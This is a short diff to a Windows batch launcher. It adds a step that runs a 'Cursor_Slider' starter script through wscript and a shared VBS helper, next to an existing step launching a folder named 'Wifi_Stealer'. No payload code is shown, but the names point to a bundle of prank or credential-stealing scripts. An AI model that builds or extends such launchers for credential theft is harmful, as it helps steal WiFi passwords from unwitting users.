@@ -38,5 +38,10 @@ cd Wifi_Stealer
 wscript.exe "..\sample.vbs" ".\main.bat"
 cd ..
 
+echo --- Cursor_Slider ---
+cd Cursor_Slider
+wscript.exe "..\sample.vbs" ".\starter.bat"
+cd ..
+
 echo -- END StartALL --
 pause
